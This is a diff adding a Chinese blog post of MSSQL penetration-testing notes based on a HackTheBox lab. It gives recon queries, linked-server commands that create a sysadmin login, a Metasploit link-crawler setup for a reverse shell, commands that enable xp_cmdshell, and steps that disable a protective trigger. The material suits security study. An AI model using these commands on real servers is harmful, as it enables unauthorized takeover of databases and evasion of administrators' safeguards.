@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="mssql 杂记1.安装mssql服务  我本地环境演示使用的是sql server 2019   安装下面链接教程即可安装   https:&#x2F;&#x2F;www.sqlservertutorial.net&#x2F;install-sql-server&#x2F;   如果想开启远程链接需要先打开SQL server 网络配置找到TCP&#x2F;IP    划到最下面IP ALL，如果没有该选项那就手动慢慢设置  TCP 动态端口设">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql 杂记">
+<meta property="og:url" content="http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/index.html">
+<meta property="og:site_name" content="ling">
+<meta property="og:description" content="mssql 杂记1.安装mssql服务  我本地环境演示使用的是sql server 2019   安装下面链接教程即可安装   https:&#x2F;&#x2F;www.sqlservertutorial.net&#x2F;install-sql-server&#x2F;   如果想开启远程链接需要先打开SQL server 网络配置找到TCP&#x2F;IP    划到最下面IP ALL，如果没有该选项那就手动慢慢设置  TCP 动态端口设">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Gzir71PYXbRQKOo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/OTLDAKFM6sP7fQZ.png">
+<meta property="og:image" content="http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/img/image-20220204153120585.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/AeSJX1W7jkrDOxf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/HeJPdrNu1lWaO2Q.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/ORHMIkJvCWSzEGg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/XujfhFHK6mspYoT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/JuF3c18X2eCM9Wg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/kC3jDSfl8PIZcx1.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/SHelwuzUBafEQDR.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/FrXiU3gMQlPJj5B.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/fmLOK4CX27YF5iN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/H28oIsbiUqQf6xN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Uo5Nw9Jh2XCzgED.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/qGpItJn2zevXAlf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/7YGQJ6W9sjkM52R.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/voh8gcPTx1LX5rV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/XWKJi9CngFTA6tb.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/yhoUn3BkCwOm9ca.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Jn6MoyBQh251OUE.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/To7bYGxXpsV3Jf8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/rCiItpBksTFRHJ8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/EO1amIf7qJrnupY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/RPyCMj4g9kuHOBY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/wqXofu1Y5lCgA8T.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/i7z2kfdX5KLPl3J.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/rOCNUI4DXlsPLtc.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/xqwT7EGrN8DU5vH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Cm62n54zlAgsNFQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/87OXlSvLrVWdyq4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/IuN6qiFhP1j7OnC.png">
+<meta property="og:image" content="http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/img/image-20220205174251491.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/PAzftGgUQFYI9Ek.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/x1rI9bFYu3mpSZ6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/7Mm6y2DVNCXHUSK.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/GoLETsciBJPfkRH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/GOpeJzN2cys1Udx.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/mBslVxWrKUg3nAk.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/bPRl4JYx6GDuwTj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/4P6VYoySKJBurcH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/g5ZAFYWX2nCr8do.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/N19zT7R6IEWZVev.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/kIAQaKEHSRs7nfU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/3KaeEyvYNZO8fPs.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/P6OyjehZrl3Q9bd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/rFYfplW8RoETjP6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Bcxr3kHUIsQ1KYo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/BSb6NOenCfuwgkJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/s7fUjCMKxvPEhbH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/IWiBPqgSvDesC2k.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/kSRvQl4FpeBZJoO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/3N4VwcXp5PY2aJy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/FPoamelQ4sMI6q5.png">
+<meta property="og:image" content="http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/img/image-20220206165226469.png">
+<meta property="article:published_time" content="2022-02-06T11:46:20.000Z">
+<meta property="article:modified_time" content="2022-02-06T14:26:07.463Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/06/Gzir71PYXbRQKOo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>mssql 杂记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/01/28/HTB-Endgames-Xen/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&text=mssql 杂记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&is_video=false&description=mssql 杂记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mssql 杂记&body=Check out this article: http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&name=mssql 杂记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&t=mssql 杂记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql-%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">mssql 杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85mssql%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">1.安装mssql服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-mssql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">2. mssql常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-mssql-link%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.mssql link服务利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.2 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-xp-cmdshell"><span class="toc-number">1.4.</span> <span class="toc-text">4.xp_cmdshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E4%BB%80%E4%B9%88%E6%98%AFxp-cmdshell"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 什么是xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 开启xp_cmdshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-NTLM"><span class="toc-number">1.5.</span> <span class="toc-text">5.NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">6.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1%E5%8F%AF%E4%BF%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1可信提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">6.1.1 环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">6.1.2 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-3-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">6.1.3 原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E8%AF%AD%E8%A8%80%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 语言提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-1-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">6.2.1 环境安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-2-python-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">6.2.2 python 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-3-R-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">6.2.3 R 提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.3.</span> <span class="toc-text">6.3 mssql 模拟登录提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">6.3.1 环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">6.3.2 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-3-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">6.3.3 原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-CLR"><span class="toc-number">1.7.</span> <span class="toc-text">7.CLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E4%BB%80%E4%B9%88%E6%98%AFCLR"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 什么是CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E5%88%9B%E5%BB%BADLL"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 创建DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SP-OACREATE"><span class="toc-number">1.8.</span> <span class="toc-text">8.SP_OACREATE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E6%A3%80%E6%B5%8BSP-OACREATE%E7%8A%B6%E6%80%81"><span class="toc-number">1.8.1.</span> <span class="toc-text">8.1 检测SP_OACREATE状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E5%90%AF%E5%8A%A8SP-OACREATE"><span class="toc-number">1.8.2.</span> <span class="toc-text">8.2 启动SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text">8.3 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Agent-Job"><span class="toc-number">1.9.</span> <span class="toc-text">9.Agent Job</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">10.沙盒执行命令</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        mssql 杂记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-06T11:46:20.000Z" itemprop="datePublished">2022-02-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="mssql-杂记"><a href="#mssql-杂记" class="headerlink" title="mssql 杂记"></a>mssql 杂记</h1><h2 id="1-安装mssql服务"><a href="#1-安装mssql服务" class="headerlink" title="1.安装mssql服务"></a>1.安装mssql服务</h2><p>  我本地环境演示使用的是<code>sql server 2019</code></p>
+<p>  安装下面链接教程即可安装</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.sqlservertutorial.net/install-sql-server/">https://www.sqlservertutorial.net/install-sql-server/</a></p>
+<p>  如果想开启远程链接需要先打开<code>SQL server 网络配置</code>找到<code>TCP/IP</code></p>
+<p><img src="https://s2.loli.net/2022/02/06/Gzir71PYXbRQKOo.png" alt="image-20220204153034484"></p>
+<p>  划到最下面<code>IP ALL</code>，如果没有该选项那就手动慢慢设置</p>
+<ul>
+<li><code>TCP 动态端口设置为空</code></li>
+<li><code>TCP 端口设置为1433</code></li>
+</ul>
+<p><img src="https://s2.loli.net/2022/02/06/OTLDAKFM6sP7fQZ.png" alt="image-20220204153057608"></p>
+<p>  重启<code>Sql server</code>服务</p>
+<p><img src="img/image-20220204153120585.png" alt="image-20220204153120585"></p>
+<h2 id="2-mssql常用命令"><a href="#2-mssql常用命令" class="headerlink" title="2. mssql常用命令"></a>2. mssql常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select @@version;  #获取mssql版本</span><br><span class="line">SELECT DB_NAME(); #列出当前数据库</span><br><span class="line">select @@servername;	#列出当前服务名</span><br><span class="line">select name FROM master..syslogins  #获取登录用户</span><br><span class="line"></span><br><span class="line">select name from master..syslogins where sysadmin = &#x27;1&#x27;;  #查询当前用户是否为sysadmin权限</span><br><span class="line">select IS_MEMBER(&#x27;db_owner&#x27;) #查询当前用户是否为dba权限</span><br><span class="line">SELECT name FROM master..sysdatabases;  #列出所有数据库</span><br><span class="line">select table_name,table_schema from flag.INFORMATION_SCHEMA.TABLES; #列出表和架构</span><br><span class="line">select * from flag.dbo.flag;	#查询数据库的数据</span><br><span class="line"></span><br><span class="line">select @@servername;	#查询当前服务名</span><br><span class="line">select srvname from sysservers;	#列出可以使用的远程链接服务器</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-mssql-link服务利用"><a href="#3-mssql-link服务利用" class="headerlink" title="3.mssql link服务利用"></a>3.mssql link服务利用</h2><h3 id="3-1-环境"><a href="#3-1-环境" class="headerlink" title="3.1 环境"></a>3.1 环境</h3><p>  演示使用的是<code>hackthebox Endgames P.O.O</code>靶场</p>
+<h3 id="3-2-原理"><a href="#3-2-原理" class="headerlink" title="3.2 原理"></a>3.2 原理</h3><p>  <code>mssql</code>允许创建外部数据源的链接，例如其他<code>sql服务器</code>，<code>Oracle数据库</code>，<code>excel电子表格</code>等，由于常见的错误配置，链接或者<code>链接服务器</code>通常可以利用来遍历数据库链接网络，获取数据，以及部署shell。</p>
+<p>  <code>mssql</code>如果启动了<code>link</code>(dataaaccess设置为1)，则数据库服务器上的每个用户都可以使用该<code>link</code>，不管用户的权限如何(<code>public,sysadmin</code>)都可以使用</p>
+<h3 id="3-2-利用"><a href="#3-2-利用" class="headerlink" title="3.2 利用"></a>3.2 利用</h3><p>  使用<code>select @@servername</code>获取当前服务名，再使用<code>select srvname from sysservers</code>查看可利用的服务</p>
+<p><img src="https://s2.loli.net/2022/02/06/AeSJX1W7jkrDOxf.png" alt="image-20220202153516249"></p>
+<p>  驱使<code>POO_CONFIG</code>向<code>POO_PUBLIC</code>询问<code>POO_CONFIG在POO_PUBLIC服务器</code>的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE (&#x27;EXECUTE (&#x27;&#x27;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#x27;&#x27;&#x27;&#x27;SERVER&#x27;&#x27;&#x27;&#x27;);&#x27;&#x27;) at [COMPATIBILITY\POO_PUBLIC]&#x27;) at [COMPATIBILITY\POO_CONFIG];</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/HeJPdrNu1lWaO2Q.png" alt="image-20220202155118103"></p>
+<p>  <strong>添加用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE(&#x27;EXECUTE(&#x27;&#x27;CREATE LOGIN ling WITH PASSWORD = &#x27;&#x27;&#x27;&#x27;qwe123QWE!@#&#x27;&#x27;&#x27;&#x27;;&#x27;&#x27;) AT [COMPATIBILITY\POO_PUBLIC]&#x27;) AT [COMPATIBILITY\POO_CONFIG]</span><br><span class="line">EXECUTE(&#x27;EXECUTE(&#x27;&#x27;EXEC sp_addsrvrolemember &#x27;&#x27;&#x27;&#x27;ling&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;sysadmin&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;) AT [COMPATIBILITY\POO_PUBLIC]&#x27;) AT [COMPATIBILITY\POO_CONFIG]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/ORHMIkJvCWSzEGg.png" alt="image-20220202161852443"></p>
+<p><strong>msf</strong></p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mssql/mssql_linkcrawler</span><br><span class="line">set DEPLOY true  <span class="comment">#如果想利用权限反弹shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/XujfhFHK6mspYoT.png" alt="image-20220202161212417"></p>
+<p><strong>参考链接</strong></p>
+<p>  <strong><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#huh">https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#huh</a></strong></p>
+<p>  <strong><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links#mssql-trusted-links">https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links#mssql-trusted-links</a></strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/">https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/</a></p>
+<h2 id="4-xp-cmdshell"><a href="#4-xp-cmdshell" class="headerlink" title="4.xp_cmdshell"></a>4.xp_cmdshell</h2><h3 id="4-1-什么是xp-cmdshell"><a href="#4-1-什么是xp-cmdshell" class="headerlink" title="4.1 什么是xp_cmdshell"></a>4.1 什么是xp_cmdshell</h3><p>  根据<code>Microsoft </code>官方文档，<code>xp_cmdshell </code>是一种生成 <code>Windows </code>命令 <code>shell </code>并传入字符串以供执行的功能。它生成的任何输出都以文本行的格式显示。为简化起见，我们可以说它允许数据库管理员直接从<code>SQL Server</code>访问和执行任何外部进程。<code>xp_cmdshell</code>的实现可以追溯到<code>SQL Server 6.5</code>。它旨在使用带有系统命令的 SQL 查询来自动执行需要额外编程和工作的各种任务。现在我们对<code>xp_cmdshell</code>有了一些了解，我们可以了解如何在 <code>SQL</code> 服务器上启用它。</p>
+<h3 id="4-2-开启xp-cmdshell"><a href="#4-2-开启xp-cmdshell" class="headerlink" title="4.2 开启xp_cmdshell"></a>4.2 开启xp_cmdshell</h3><p>  <code>xp_cmdshell</code>在<code>Sql server 2005</code>之前是无需开启的，默认会开启。<code>sql server 2005</code>及以后的版本需要手动开启，默认关闭。开启<code>xp_cmdshell</code>正常来说需要<code>sa(sysadmin)</code>权限</p>
+<p>  <strong>开启<code>xp_cmdshell</code>命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line">RECONFIGURE</span><br><span class="line">sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p>   **<code>Sql server 2008</code>**以及更高版本存在一个触发器，该触发器可以对服务器进行的操作设置一个触发机制。比如限制用户开启<code>xp_cmdshell</code>等</p>
+<p><img src="https://s2.loli.net/2022/02/06/JuF3c18X2eCM9Wg.png" alt="image-20220206000932464"></p>
+<p>  遇到这种情况只要查询触发器名称然后关闭即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select name from sys.server_triggers;</span><br><span class="line">disable trigger Stop_XP_CommandShell on all server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/kC3jDSfl8PIZcx1.png" alt="image-20220206001120015"></p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/">https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/</a></p>
